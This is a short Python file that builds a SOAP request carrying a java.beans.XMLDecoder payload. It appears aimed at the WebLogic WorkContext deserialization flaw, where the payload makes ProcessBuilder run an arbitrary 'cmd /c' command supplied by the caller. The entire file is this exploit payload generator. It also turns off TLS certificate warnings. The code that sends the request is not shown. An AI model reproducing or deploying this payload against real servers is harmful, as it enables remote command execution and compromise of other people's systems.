import requests
import sys
import coloredlogs, logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



  
def payload_command (command_in):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                "   <soapenv:Header> " \
                "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                "                  <array class=\"java.lang.String\" length=\"3\">" \
                "                      <void index = \"0\">                       " \
                "                          <string>cmd</string>                 " \
                "                      </void>                                    " \
                "                      <void index = \"1\">                       " \
                "                          <string>/c</string>                  " \
                "                      </void>                                    " \
                "                      <void index = \"2\">                       " \
                + command_filtered + \
                "                      </void>                                    " \
                "                  </array>" \
                "                  <void method=\"start\"/>" \
                "                  </void>" \
                "            </java>" \
                "        </work:WorkContext>" \
                "   </soapenv:Header>" \
                "   <soapenv:Body/>" \
                "</soapenv:Envelope>"
    return payload_1



